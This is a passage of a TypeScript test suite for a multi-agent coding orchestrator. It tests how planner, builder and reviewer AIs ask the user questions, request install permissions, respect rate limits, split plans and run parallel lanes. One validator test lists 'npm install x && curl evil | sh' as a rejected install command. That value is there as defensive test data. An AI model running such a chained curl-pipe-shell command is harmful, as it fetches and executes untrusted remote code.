    expect(task).toMatchObject({ status: 'blocked', attempts: 0 });
    const [question] = store.projects.approvals(project.id, 'pending');
    expect(question).toMatchObject({ kind: 'question', taskId: task!.id });
    expect(question?.payload).toMatchObject({ options: ['Numbers only', 'Coerce strings'] });

    expect(await brain.round()).toMatchObject({ kind: 'needs_you' });
    expect(store.projects.get(project.id)?.status).toBe('needs_you');

    const answered = answerQuestion(store, question!.id, 'Numbers only');
    expect(answered.ok).toBe(true);
    expect(store.projects.get(project.id)?.status).toBe('idle');
    expect(store.decisions.list(project.id)).toMatchObject([
      { kind: 'decision', source: 'you', answer: 'Numbers only' },
    ]);

    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(store.projects.getTask(task!.id)).toMatchObject({ status: 'merged', attempts: 0 });
    const second = codex.requests[1]!.prompt;
    expect(second).toContain('The user answered "Should sum accept strings?": Numbers only');
    expect(second).toContain('DECISIONS (follow these; they come from the user)');
  });

  it('decides for itself under the "decide" policy and records an assumption', async () => {
    let n = 0;
    const { store, brain, project } = await setup({
      askPolicy: 'decide',
      codex: {
        reply: () => (n++ === 0 ? QUESTION : 'Created sum.js'),
        act: (req) => {
          if (n > 0) writeSum('a + b')(req);
        },
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(
      store.projects.approvals(project.id, 'pending').filter((a) => a.kind === 'question'),
    ).toEqual([]);
    expect(store.decisions.list(project.id)).toMatchObject([
      { kind: 'assumption', source: 'agent', answer: 'Numbers only' },
    ]);
    expect(store.projects.listTasks(project.id)[0]).toMatchObject({
      status: 'merged',
      attempts: 0,
    });
  });

  it('lets the reviewers vote under the "council" policy', async () => {
    let n = 0;
    let plans = 0;
    const vote = (req: RunRequest) =>
      req.prompt.includes('needs a product decision') ? '{"choice": "coerce strings"}' : undefined;
    const { store, brain, project } = await setup({
      askPolicy: 'council',
      codex: {
        reply: (req) =>
          vote(req) ?? (req.role === 'reviewer' ? APPROVE : n++ === 0 ? QUESTION : 'done'),
        act: (req) => {
          if (req.role === 'builder' && n > 0) writeSum('a + b')(req);
        },
      },
      claude: {
        reply: (req) =>
          vote(req) ?? (req.role === 'planner' ? (plans++ === 0 ? PLAN : DONE) : APPROVE),
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(store.decisions.list(project.id)).toMatchObject([
      { kind: 'assumption', source: 'council', answer: 'Coerce strings' },
    ]);
  });

  it('reads a question asked in prose when nothing changed', async () => {
    const { store, brain, project } = await setup({
      codex: { reply: 'I looked around.\n\nShould I put sum in its own file or in index.js?' },
    });
    await brain.round();
    expect(await brain.round()).toMatchObject({ kind: 'asked' });
    expect(store.projects.approvals(project.id, 'pending')[0]?.summary).toBe(
      'Should I put sum in its own file or in index.js?',
    );
  });

  it('stops planning on a planner question and plans again after the answer', async () => {
    let plans = 0;
    const { store, brain, project, claude } = await setup({
      claude: {
        reply: (req) => {
          if (req.role !== 'planner') return APPROVE;
          plans++;
          return plans === 1 ? QUESTION : plans === 2 ? PLAN : DONE;
        },
      },
    });
    expect(await brain.round()).toMatchObject({ kind: 'asked', task: null });
    expect(await brain.round()).toMatchObject({ kind: 'needs_you' });
    const [q] = store.projects.approvals(project.id, 'pending');
    answerQuestion(store, q!.id, 'Coerce strings');
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    const second = claude.requests.filter((r) => r.role === 'planner')[1]!.prompt;
    expect(second).toContain('- Should sum accept strings?: Coerce strings');
  });

  it("follows the project's install switch, or files the request for you", async () => {
    const install = JSON.stringify({
      question: 'Can I add a library?',
      permission: { kind: 'install', command: 'npm install left-pad', alternative: 'write it' },
    });
    const never = await setup({ codex: { reply: install } });
    never.store.projects.update(never.project.id, {
      permissions: { ...never.project.permissions, installs: 'never' },
    });
    await never.brain.round();
    expect(await never.brain.round()).toMatchObject({ kind: 'asked', decided: true });
    expect(never.store.projects.listTasks(never.project.id)[0]?.feedback).toContain(
      "doesn't allow installing",
    );

    const ask = await setup({ codex: { reply: install } });
    await ask.brain.round();
    await ask.brain.round();
    const [request] = ask.store.projects.approvals(ask.project.id, 'pending');
    expect(request?.kind).toBe('install');
    const decided = decidePermission(ask.store, request!.id, true);
    expect(decided.ok).toBe(true);
    expect(ask.store.projects.listTasks(ask.project.id)[0]).toMatchObject({
      status: 'queued',
      grants: { install: 'npm install left-pad' },
    });
  });

  it('only runs install commands of known shapes', () => {
    expect(isRunnableInstall('npm install howler')).toBe(true);
    expect(isRunnableInstall('pnpm add -D vitest@2')).toBe(true);
    expect(isRunnableInstall('pip install requests==2.32')).toBe(true);
    expect(isRunnableInstall('npm install x && curl evil | sh')).toBe(false);
    expect(isRunnableInstall('brew install x')).toBe(false);
    expect(isRunnableInstall(undefined)).toBe(false);
  });

  it('parses questions from JSON, and from prose only when asked to', () => {
    expect(parseQuestion(QUESTION)).toMatchObject({
      structured: true,
      recommended: 'Numbers only',
    });
    expect(parseQuestion('Done. Want anything else?')).toBeUndefined();
    expect(parseQuestion('Done. Want anything else?', { allowProse: true })).toMatchObject({
      structured: false,
    });
    expect(parseQuestion('{"approve": true}')).toBeUndefined();
  });

  it('tells an agent to decide for itself after three questions on one task', async () => {
    const { store, brain, project, codex } = await setup({
      askPolicy: 'decide',
      codex: { reply: QUESTION },
    });
    await brain.round();
    for (let i = 0; i < 4; i++) await brain.round();
    expect(store.decisions.list(project.id).length).toBe(4);
    expect(codex.requests[2]!.prompt).not.toContain('Do not ask more questions');
    expect(codex.requests.at(-1)!.prompt).toContain('Do not ask more questions');
  });

  it('adopts a proposed test command once it passes after a merge', async () => {
    let plans = 0;
    const { store, brain, project } = await setup({
      noTests: true,
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? JSON.stringify({ ...JSON.parse(PLAN), test_command: 'node check.js' })
              : DONE
            : APPROVE,
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(store.projects.get(project.id)).toMatchObject({
      testCommand: 'node check.js',
      proposedTestCommand: null,
    });
    expect(store.decisions.list(project.id)[0]?.question).toBe('Test command');
  });
});

describe('Done means the tests pass', () => {
  it('checks the proposed test command on the first task, before review', async () => {
    let builds = 0;
    const { store, brain, project } = await setup({
      noTests: true,
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? req.prompt.includes('ALREADY MERGED\n- none')
              ? JSON.stringify({ ...JSON.parse(PLAN), test_command: 'node check.js' })
              : DONE
            : APPROVE,
      },
      codex: {
        reply: 'done',
        act: (req) => writeSum(builds++ === 0 ? 'a - b' : 'a + b')(req),
      },
    });
    expect((await brain.run({ maxRounds: 12 })).kind).toBe('done');
    const titles = store.projects.listTasks(project.id).map((t) => [t.title, t.status]);
    // The broken first build is sent back with the test output; no extra task, no wasted review.
    expect(titles).toEqual([['Add sum', 'merged']]);
    expect(builds).toBe(2);
    expect(store.projects.get(project.id)?.testCommand).toBe('node check.js');
    const events = store.projects.events(project.id).map((e) => e.message);
    expect(events).toContain('Tests failed (exit 1)');
    expect(events.filter((e) => e.startsWith('Reviewing with'))).toHaveLength(1);
  });
});

describe('Installs', () => {
  it('never files a planner install request; the builder asks when its task needs it', async () => {
    let plans = 0;
    const { store, brain, project, claude } = await setup({
      claude: {
        reply: (req) => {
          if (req.role !== 'planner') return APPROVE;
          plans++;
          return plans === 1
            ? JSON.stringify({
                question: 'May the builder run npm install left-pad?',
                permission: { kind: 'install', command: 'npm install left-pad' },
              })
            : plans === 2
              ? PLAN
              : DONE;
        },
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(store.projects.approvals(project.id).filter((a) => a.kind === 'install')).toEqual([]);
    expect(store.decisions.list(project.id)[0]).toMatchObject({ kind: 'assumption', taskId: null });
    const second = claude.requests.filter((r) => r.role === 'planner')[1]!.prompt;
    expect(second).toContain('Never ask about installing packages');
  });

  it('keeps package folders out of git after an approved install', () => {
    const dir = mkdtempSync(join(tmpdir(), 'conclave-ignore-'));
    cleanup.push(dir);
    expect(ensureIgnored(dir, 'npm install howler')).toBe('node_modules/');
    expect(readFileSync(join(dir, '.gitignore'), 'utf8')).toBe('node_modules/\n');
    expect(ensureIgnored(dir, 'npm install other')).toBeUndefined();
    writeFileSync(join(dir, '.gitignore'), '.env');
    expect(ensureIgnored(dir, 'pnpm add x')).toBe('node_modules/');
    expect(readFileSync(join(dir, '.gitignore'), 'utf8')).toBe('.env\nnode_modules/\n');
    expect(ensureIgnored(dir, 'cargo add serde')).toBeUndefined();
  });
});

describe('Clarify first', () => {
  it('re-plans around your answers without asking them again', () => {
    const project = { goal: 'Ship sum', testCommand: 'node check.js' } as never;
    const fresh = clarifyPrompt(project, [], 0);
    expect(fresh).not.toContain('THE USER HAS ANSWERED');
    const replan = clarifyPrompt(project, [], 0, [{ question: 'Theme?', answer: 'Dark' }]);
    expect(replan).toContain('THE USER HAS ANSWERED');
    expect(replan).toContain('- Theme?: Dark');
    expect(replan).toContain('return "questions": [] unless something new must be decided');
  });

  it('drops malformed questions and keeps the draft plan', () => {
    const parsed = parseClarify(
      JSON.stringify({
        questions: [
          { id: 'q1', question: 'Theme?', options: ['Light', 'Dark'], recommended: 'Dark' },
          { id: 'q2', question: 'No options' },
          { question: 'Bad pick', options: ['A', 'B'], recommended: 'C' },
        ],
        tasks: [{ title: 'Add sum', spec: 'Create sum.js' }, { title: '' }],
        test_command: 'node check.js',
      }),
    );
    expect(parsed?.questions.map((q) => [q.question, q.recommended])).toEqual([
      ['Theme?', 'Dark'],
      ['Bad pick', undefined],
    ]);
    expect(parsed?.tasks).toHaveLength(1);
    expect(parsed?.testCommand).toBe('node check.js');
  });

  it('asks the planner once, read-only, then starts the draft with your answers', async () => {
    const { repo, home } = await setup();
    const store = new Store(':memory:');
    const claude = new FakeAdapter(
      {
        reply: JSON.stringify({
          questions: [
            { id: 'q1', question: 'Theme?', options: ['Light', 'Dark'], recommended: 'Dark' },
          ],
          tasks: [{ title: 'Add sum', spec: 'Create sum.js' }],
          test_command: 'node check.js',
        }),
      },
      { id: 'claude' },
    );
    const ctx = { store, adapters: adapterMap([claude]), cwd: home };
    const project = await createProject(store, [{ provider: 'claude' }], {
      repoPath: repo,
      goal: 'Ship sum',
      draft: true,
    });
    expect(project.status).toBe('draft');
    await expect(new Brain(ctx, project.id, { home }).round()).rejects.toThrow(/Finish setting up/);

    const result = await clarify(ctx, project.id);
    expect(claude.requests[0]).toMatchObject({
      role: 'planner',
      readOnly: true,
      cwd: project.repoPath,
    });
    expect(result.questions[0]?.question).toBe('Theme?');

    const started = startDraft(ctx, project.id, {
      answers: [
        { question: 'Theme?', answer: 'Dark' },
        { question: 'Decimals?', answer: '2', assumed: true },
      ],
      tasks: result.tasks,
      testCommand: result.testCommand ?? null,
    });
    expect(started).toMatchObject({ status: 'idle', proposedTestCommand: 'node check.js' });
    expect(store.projects.listTasks(project.id).map((t) => t.title)).toEqual(['Add sum']);
    expect(store.decisions.list(project.id).map((d) => [d.kind, d.source])).toEqual([
      ['decision', 'clarify'],
      ['assumption', 'clarify'],
    ]);
  });
});

describe('Governor', () => {
  const reading = (provider: ProviderId, utilization: number, resetsAt: number | null, at = 0) => ({
    provider,
    window: 'five_hour',
    utilization,
    resetsAt,
    at,
  });

  it('skips providers near their limit and ignores readings past their reset', () => {
    let now = 1_000;
    const readings = [reading('codex', 0.95, 5_000)];
    const g = new Governor(() => readings, { now: () => now });
    expect(g.pick([{ provider: 'codex' }, { provider: 'claude' }])).toEqual({
      seat: { provider: 'claude' },
    });
    now = 6_000;
    expect(g.pick([{ provider: 'codex' }, { provider: 'claude' }])).toEqual({
      seat: { provider: 'codex' },
    });
  });

  it('backs off after a limit without a reset time, doubling each time', () => {
    let now = 0;
    const g = new Governor(() => [], { now: () => now, baseBackoffMs: 1000 });
    g.observe('codex', { ok: false, rateLimited: { message: 'limit' } });
    expect(g.availability('codex')).toEqual({ ok: false, reason: 'limit', until: 1000 });
    now = 1000;
    g.observe('codex', { ok: false, rateLimited: { message: 'limit' } });
    expect(g.availability('codex')).toMatchObject({ until: 3000 });
    g.observe('codex', { ok: true });
    expect(g.availability('codex')).toEqual({ ok: true });
  });

  it('prefers providers not in the avoid list, falling back to them', () => {
    const g = new Governor(() => []);
    expect(g.pick([{ provider: 'claude' }, { provider: 'codex' }], ['claude'])).toEqual({
      seat: { provider: 'codex' },
    });
    expect(g.pick([{ provider: 'claude' }], ['claude'])).toEqual({ seat: { provider: 'claude' } });
  });

  it('reports the earliest reset when nobody is free', () => {
    const g = new Governor(
      () => [reading('claude', 1, 9_000, 0), reading('codex', 0.99, 4_000, 0)],
      { now: () => 0 },
    );
    expect(g.pick([{ provider: 'claude' }, { provider: 'codex' }])).toMatchObject({
      seat: null,
      until: 4_000,
    });
  });
});

describe('agent replies', () => {
  it('reads plans from fenced, bare or wrapped JSON', () => {
    expect(parsePlan(DONE, 5)).toEqual({ done: true, reason: 'sum.js works' });
    expect(parsePlan(`Sure! Here you go: ${PLAN} Let me know.`, 5)).toEqual({
      done: false,
      tasks: [{ title: 'Add sum', spec: 'Create sum.js exporting (a, b) => a + b.' }],
    });
    expect(
      parsePlan('{"tasks": [{"title": "", "spec": "x"}, {"title": "a", "spec": "b"}]}', 5),
    ).toEqual({
      done: false,
      tasks: [{ title: 'a', spec: 'b' }],
    });
    expect(parsePlan('no json here', 5)).toBeUndefined();
  });

  it('reads review verdicts', () => {
    expect(parseReview(APPROVE)).toEqual({ approve: true, issues: [], summary: 'Looks right' });
    expect(parseReview('{"approve": "yes"}')).toBeUndefined();
  });
});

describe('log formatting', () => {
  it('strips shell wrappers from commands', () => {
    expect(
      displayCommand(
        '"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" -Command \'npm.cmd test\'',
      ),
    ).toBe('npm.cmd test');
    expect(displayCommand('/bin/bash -lc "npm test"')).toBe('npm test');
    expect(displayCommand('git status')).toBe('git status');
  });

  it('shows worktree paths relative to the worktree', () => {
    const cwd = join(tmpdir(), 'wt');
    expect(displayPath(join(cwd, 'src', 'a.js'), cwd)).toBe('src/a.js');
    expect(displayPath('b.js', cwd)).toBe('b.js');
  });
});

describe('Right-sized plans', () => {
  const est = (lines: number, risk: 'low' | 'medium' | 'high' = 'low', files = ['a.js']) => ({
    files,
    lines,
    risk,
  });
  const merged = (estimate: number, actual: number, at: number) =>
    ({
      status: 'merged',
      estimate: est(estimate),
      actualLines: actual,
      updatedAt: at,
    }) as never;

  it('folds small neighbours into one task, but never high-risk work or takeovers', () => {
    const shaped = shapePlan([
      { title: 'Add a', spec: 'a', estimate: est(40) },
      { title: 'Add b', spec: 'b', estimate: est(50, 'medium', ['b.js']) },
      { title: 'Migrate data', spec: 'm', estimate: est(30, 'high') },
      { title: 'Redo c', spec: 'c', estimate: est(20), replaces: 'k_1' },
      { title: 'Big feature', spec: 'f', estimate: est(300) },
    ]);
    expect(shaped.folded).toBe(1);
    expect(shaped.tasks.map((t) => t.title)).toEqual([
      'Add a; Add b',
      'Migrate data',
      'Redo c',
      'Big feature',
    ]);
    expect(shaped.tasks[0]!.spec).toBe('1. Add a\na\n\n2. Add b\nb');
    expect(shaped.tasks[0]!.estimate).toEqual({
      files: ['a.js', 'b.js'],
      lines: 90,
      risk: 'medium',
    });
    expect(shaped.oversized).toEqual([]);
  });

  it('keeps a folded task reviewable and leaves tasks without estimates alone', () => {
    const shaped = shapePlan([
      { title: 'One', spec: '1', estimate: est(110) },
      { title: 'Two', spec: '2', estimate: est(110) },
      { title: 'Three', spec: '3', estimate: est(110) },
      { title: 'Four', spec: '4', estimate: est(110) },
      { title: 'Five', spec: '5' },
    ]);
    expect(shaped.tasks.map((t) => t.title)).toEqual(['One; Two; Three', 'Four', 'Five']);
  });

  it('flags tasks too big to review, scaled by how far off past estimates were', () => {
    expect(shapePlan([{ title: 'Huge', spec: 'h', estimate: est(900) }]).oversized).toEqual([
      { title: 'Huge', lines: 900 },
    ]);
    // This planner underestimates by 2x, so 500 really means ~1000.
    const scale = calibration([merged(100, 200, 3), merged(50, 100, 2), merged(10, 20, 1)]);
    expect(scale).toBe(2);
    expect(shapePlan([{ title: 'Big', spec: 'b', estimate: est(500) }], scale).oversized).toEqual([
      { title: 'Big', lines: 1000 },
    ]);
    expect(calibration([merged(100, 900, 1), merged(100, 900, 2), merged(100, 900, 3)])).toBe(3);
    expect(calibration([merged(100, 200, 1)])).toBe(1);
  });

  it('reads changed lines from a diff stat', () => {
    expect(
      changedLines(' a.js | 3 ++-\n 2 files changed, 12 insertions(+), 4 deletions(-)\n'),
    ).toBe(16);
    expect(changedLines(' 1 file changed, 1 insertion(+)')).toBe(1);
    expect(changedLines('')).toBe(0);
  });

  it('asks the planner once to split a task too big to review, then records the real size', async () => {
    const huge = JSON.stringify({
      done: false,
      tasks: [{ title: 'Everything', spec: 'All of it', estimate: est(2000) }],
    });
    const split = JSON.stringify({
      done: false,
      tasks: [{ title: 'Add sum', spec: 'Create sum.js', estimate: est(5, 'low', ['sum.js']) }],
    });
    let plans = 0;
    const { store, project, brain, claude } = await setup({
      claude: {
        reply: (req) => (req.role === 'planner' ? [huge, split, DONE][plans++]! : APPROVE),
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    const planner = claude.requests.filter((r) => r.role === 'planner');
    expect(planner[1]!.prompt).toContain('TOO BIG TO REVIEW WELL');
    expect(planner[1]!.prompt).toContain('- Everything (~2000 lines)');
    const [task] = store.projects.listTasks(project.id);
    expect(task!.title).toBe('Add sum');
    expect(task!.estimate).toEqual(est(5, 'low', ['sum.js']));
    expect(task!.actualLines).toBe(1);
  });

  it('lets the last task’s reviewer confirm the goal, skipping the extra planner round', async () => {
    const { brain, claude, store, project } = await setup({
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? PLAN
            : '{"approve": true, "issues": [], "summary": "sum works", "goal_met": true, "goal_gaps": []}',
      },
    });
    const outcome = await brain.run({ maxRounds: 10 });
    expect(outcome).toMatchObject({ kind: 'done' });
    expect(outcome.kind === 'done' && outcome.reason).toContain('checked the whole result');
    expect(claude.requests.map((r) => r.role)).toEqual(['planner', 'reviewer']);
    expect(claude.requests[1]!.prompt).toContain('THIS IS THE LAST PLANNED TASK');
    expect(store.projects.approvals(project.id, 'pending')[0]?.kind).toBe('push');
  });

  it('hands the gaps a goal check finds to the next plan', async () => {
    let plans = 0;
    const { brain, claude } = await setup({
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? [PLAN, DONE][plans++]!
            : '{"approve": true, "issues": [], "summary": "ok", "goal_met": false, "goal_gaps": ["sum has no tests"]}',
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    const planner = claude.requests.filter((r) => r.role === 'planner');
    expect(planner[1]!.prompt).toContain('THE LAST REVIEW FOUND THE GOAL NOT YET MET');
    expect(planner[1]!.prompt).toContain('- sum has no tests');
  });
});

describe('Lanes', () => {
  interface Span {
    title: string;
    provider: string;
    start: number;
    end: number;
  }
  const lines200 = (file: string) => ({ files: [file], lines: 200, risk: 'low' as const });

  async function lanes(opts: {
    tasks: { title: string; file: string; after?: number[] }[];
    testCommand?: string;
    laneCaps?: Partial<Record<ProviderId, number>>;
    glue?: boolean;
  }) {
    const repo = makeRepo();
    const home = mkdtempSync(join(tmpdir(), 'conclave-home-'));
    cleanup.push(home);
    const store = new Store(':memory:');
    const spans: Span[] = [];
    const plan = JSON.stringify({
      done: false,
      tasks: opts.tasks.map((t) => ({
        title: t.title,
        spec: `Create ${t.file}`,
        estimate: lines200(t.file),
        ...(t.after && { after: t.after }),
      })),
    });
    let plans = 0;
    const build = (provider: string) => async (req: RunRequest) => {
      const task = opts.tasks.find((t) => req.prompt.includes(`YOUR TASK: ${t.title}`))!;
      const span = { title: task.title, provider, start: Date.now(), end: 0 };
      await new Promise((r) => setTimeout(r, 1500));
      writeFileSync(join(req.cwd, task.file), `module.exports = '${task.title}';\n`);
      // Told the combined result fails: also write the glue both files need together.
      if (opts.glue && req.prompt.includes('merged meanwhile')) {
        writeFileSync(join(req.cwd, 'glue.js'), 'module.exports = 1;\n');
      }
      span.end = Date.now();
      spans.push(span);
    };
    const claude = new FakeAdapter(
      {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? plan
              : DONE
            : req.role === 'reviewer'
              ? APPROVE
              : 'Done',
        act: (req) => (req.role === 'builder' ? build('claude')(req) : undefined),
      },
      { id: 'claude' },
    );
    const codex = new FakeAdapter(
      {
        reply: (req) => (req.role === 'reviewer' ? APPROVE : 'Done'),
        act: (req) => (req.role === 'builder' ? build('codex')(req) : undefined),
      },
      { id: 'codex' },
    );
    const project = await createProject(store, [{ provider: 'claude' }, { provider: 'codex' }], {
      repoPath: repo,
      goal: 'Ship the files',
      testCommand: opts.testCommand ?? 'node -e "process.exit(0)"',
      maxParallel: 2,
    });
    const brain = new Brain(
      { store, adapters: adapterMap([claude, codex]), cwd: home },
      project.id,
      {
        home,
        ...(opts.laneCaps && { laneCaps: opts.laneCaps }),
      },
    );
    const outcome = await brain.run({ maxRounds: 40 });
    const tasks = store.projects.listTasks(project.id);
    const events = store.projects.events(project.id).map((e) => e.message);
    return { repo, store, project, outcome, tasks, spans, events };
  }
  const overlap = (a: Span, b: Span) => a.start < b.end && b.start < a.end;

  it('builds independent tasks at the same time and re-tests the later merge', async () => {
    const { repo, outcome, tasks, spans, events } = await lanes({
      tasks: [
        { title: 'Add a', file: 'a.js', after: [] },
        { title: 'Add b', file: 'b.js', after: [] },
      ],
    });
    expect(outcome.kind).toBe('done');
    expect(tasks.map((t) => t.status)).toEqual(['merged', 'merged']);
    expect(spans).toHaveLength(2);
    expect(overlap(spans[0]!, spans[1]!)).toBe(true);
    expect(git(repo, 'show', 'conclave/integration:a.js')).toContain('Add a');
    expect(git(repo, 'show', 'conclave/integration:b.js')).toContain('Add b');
    expect(events).toContain('Re-tested on top of work merged meanwhile: passed');
  });

  it('keeps tasks in order when the planner gives no "after"', async () => {
    const { outcome, tasks, spans } = await lanes({
      tasks: [
        { title: 'Add a', file: 'a.js' },
        { title: 'Add b', file: 'b.js' },
      ],
    });
    expect(outcome.kind).toBe('done');
    expect(tasks[1]!.after).toEqual([tasks[0]!.id]);
    expect(overlap(spans[0]!, spans[1]!)).toBe(false);
  });

  it('never puts more builders on one AI than its lane cap', async () => {
    const { outcome, tasks, spans } = await lanes({
      tasks: [
        { title: 'Add a', file: 'a.js', after: [] },
        { title: 'Add b', file: 'b.js', after: [] },
      ],
      laneCaps: { codex: 1, claude: 1 },
    });
    expect(outcome.kind).toBe('done');
    expect(new Set(tasks.map((t) => t.builtBy))).toEqual(new Set(['codex', 'claude']));
    expect(overlap(spans[0]!, spans[1]!)).toBe(true);
    // Each was reviewed by the other AI.
    expect(tasks.every((t) => t.reviewedBy && t.reviewedBy !== t.builtBy)).toBe(true);
  });

  it('holds a task whose files overlap a running lane', async () => {
    const { outcome, spans } = await lanes({
      tasks: [
        { title: 'Add a', file: 'a.js', after: [] },
        { title: 'Change a', file: 'a.js', after: [] },
      ],
    });
    expect(outcome.kind).toBe('done');
    expect(overlap(spans[0]!, spans[1]!)).toBe(false);
  });

  it('sends back work that passes alone but fails combined, without counting the attempt', async () => {
    const check = `const fs = require('fs'); if (fs.existsSync('a.js') && fs.existsSync('b.js') && !fs.existsSync('glue.js')) { console.error('a and b need glue.js'); process.exit(1); }`;
    const { repo, outcome, tasks, events } = await lanes({
      tasks: [
        { title: 'Add a', file: 'a.js', after: [] },
        { title: 'Add b', file: 'b.js', after: [] },
      ],
      testCommand: `node -e "${check.replace(/"/g, '\\"')}"`,
      glue: true,
    });
    expect(outcome.kind).toBe('done');
    expect(tasks.map((t) => t.status)).toEqual(['merged', 'merged']);
    expect(events).toContain('Tests fail once combined with work merged meanwhile; rebuilding');
    const rebuilt = tasks.find((t) => t.freeRetries > 0)!;
    expect(rebuilt.attempts).toBe(0);
    expect(rebuilt.lastFailure?.kind).toBe('combined_tests');
    expect(git(repo, 'show', 'conclave/integration:glue.js')).toContain('1');
  });
});

describe('Shared limits', () => {
  const day = (iso: string) => new Date(iso);
  const limits = (patch: Partial<LimitSettings> = {}): LimitSettings => ({
    providers: {},
    quietHours: [],
    pauseAll: false,
    ...patch,
  });

  it('knows when quiet hours end, including windows past midnight', () => {
    const workdays = {
      days: [1, 2, 3, 4, 5],
      from: '09:00',
      to: '17:00',
      providers: ['claude' as ProviderId],
    };
    const nights = { days: [0, 1, 2, 3, 4, 5, 6], from: '23:00', to: '07:00', providers: null };
    // Wednesday 10:30: Claude is quiet until 17:00, Codex isn't.
    const wed = day('2026-10-21T10:30:00');
    expect(new Date(quietUntil([workdays], 'claude', wed)!).getHours()).toBe(17);
    expect(quietUntil([workdays], 'codex', wed)).toBeNull();
    // Saturday 10:30: not a workday.
    expect(quietUntil([workdays], 'claude', day('2026-10-24T10:30:00'))).toBeNull();
    // 23:30 and 02:00: the night rule, ending at 07:00 the next morning.
    const late = new Date(quietUntil([nights], 'codex', day('2026-10-21T23:30:00'))!);
    expect([late.getDate(), late.getHours()]).toEqual([22, 7]);
    const early = new Date(quietUntil([nights], 'codex', day('2026-10-22T02:00:00'))!);
    expect([early.getDate(), early.getHours()]).toEqual([22, 7]);
    expect(quietUntil([nights], 'codex', day('2026-10-22T08:00:00'))).toBeNull();
  });

  it('turns pause-all, daily caps and the reserve into plain waits', () => {
    let runs = 0;
    let settings = limits();
    const now = day('2026-10-21T10:00:00').getTime();
    const policy = { limits: () => settings, runsToday: () => runs };
    const g = new Governor(
      () =>
        [
          {
            provider: 'claude',
            window: 'five_hour',
            utilization: 0.91,
            resetsAt: now + 3_600_000,
            at: now,
          },
        ] as never,
      { now: () => now, policy },
    );
    expect(g.availability('claude')).toMatchObject({
      ok: false,
      reason: 'leaving 10% for you, 5-hour window at 91%',
    });
    settings = limits({ providers: { claude: { leaveForMe: 0, dailyCap: null } } });
    expect(g.availability('claude').ok).toBe(true);
    settings = limits({ providers: { codex: { leaveForMe: 0.1, dailyCap: 3 } } });
    runs = 3;
    expect(g.availability('codex')).toMatchObject({
      ok: false,
      reason: 'daily cap reached (3 runs), resumes at midnight',
    });
    settings = limits({ pauseAll: true });
    expect(g.availability('codex')).toEqual({
      ok: false,
      reason: 'you paused everything',
      until: null,
    });
  });

  it('counts lanes across every project', () => {
    const store = new Store(':memory:');
    const routing = { planner: [], builder: [], reviewer: [] };
    const a = store.projects.create({
      name: 'a',
      repoPath: '/a',
      goal: 'g',
      baseBranch: 'main',
      routing,
    });
    const b = store.projects.create({
      name: 'b',
      repoPath: '/b',
      goal: 'g',
      baseBranch: 'main',
      routing,
    });
    const [ta] = store.projects.addTasks(a.id, [{ title: 'x', spec: 'x' }]);
    const [tb] = store.projects.addTasks(b.id, [{ title: 'y', spec: 'y' }]);
    store.projects.updateTask(ta!.id, { status: 'building', builtBy: 'codex' });
    store.projects.updateTask(tb!.id, { status: 'building', builtBy: 'codex' });
    expect(store.projects.countBuilding('codex')).toBe(2);
    expect(store.projects.countBuilding('claude')).toBe(0);
  });
});

describe('Steering', () => {
  function board() {
    const store = new Store(':memory:');
    const routing = { planner: [{ provider: 'claude' as ProviderId }], builder: [], reviewer: [] };
    const project = store.projects.create({
      name: 'p',
      repoPath: tmpdir(),
      goal: 'g',
      baseBranch: 'main',
      routing,
    });
    const tasks = store.projects.addTasks(project.id, [
      { title: 'One', spec: '1' },
      { title: 'Two', spec: '2' },
      { title: 'Three', spec: '3' },
    ]);
    const titles = () =>
      store.projects
        .listTasks(project.id)
        .filter((t) => ['queued', 'blocked'].includes(t.status))
        .map((t) => t.title);
    return { store, project, tasks, titles };
  }

  it('moves, places, edits and adds tasks on the board, and logs each', () => {
    const { store, project, tasks, titles } = board();
    moveTask(store.projects, tasks[2]!.id, 'up');
    expect(titles()).toEqual(['One', 'Three', 'Two']);
    // Three jumped Two, so it no longer waits for it.
    expect(store.projects.getTask(tasks[2]!.id)!.after).toEqual([]);
    placeTask(store.projects, tasks[0]!.id, null);
    expect(titles()).toEqual(['Three', 'Two', 'One']);
    placeTask(store.projects, tasks[0]!.id, tasks[2]!.id);
    expect(titles()).toEqual(['One', 'Three', 'Two']);
    editTask(store.projects, tasks[1]!.id, { title: 'Two, renamed', spec: 'new spec' });
    expect(store.projects.getTask(tasks[1]!.id)).toMatchObject({
      title: 'Two, renamed',
      spec: 'new spec',
    });
    const added = addTask(store.projects, project.id, {
      title: 'Four',
      spec: '4',
      after: [tasks[0]!.id, 'k_nope'],
    });
    expect(added.after).toEqual([tasks[0]!.id]);
    expect(titles().at(-1)).toBe('Four');
    store.projects.updateTask(tasks[0]!.id, { status: 'building' });
    expect(() => moveTask(store.projects, tasks[0]!.id, 'down')).toThrow(/haven’t started/);
    expect(editTask(store.projects, tasks[0]!.id, { spec: 'tweak' }).spec).toBe('tweak');
    const log = store.projects.events(project.id).map((e) => e.message);
    expect(log).toContain('You moved Three above Two');
    expect(log).toContain('You edited One (applies from its next attempt)');
    expect(log).toContain('You added Four');
  });

  it('keeps only valid actions from the planner', () => {
    const parsed = parseSteering(
      '```json\n' +
        JSON.stringify({
          reply: 'Done.',
          actions: [
            { type: 'add_task', title: 'Bigger buttons', spec: 'Make them 48px' },
            { type: 'skip_task' },
            { type: 'explode' },
            { type: 'pause' },
          ],
        }) +
        '\n```',
    );
    expect(parsed.reply).toBe('Done.');
    expect(parsed.actions).toEqual([
      { type: 'add_task', title: 'Bigger buttons', spec: 'Make them 48px', after: [] },
      { type: 'pause' },
    ]);
    expect(parseSteering('Just text, no JSON')).toEqual({
      reply: 'Just text, no JSON',
      actions: [],
    });
  });

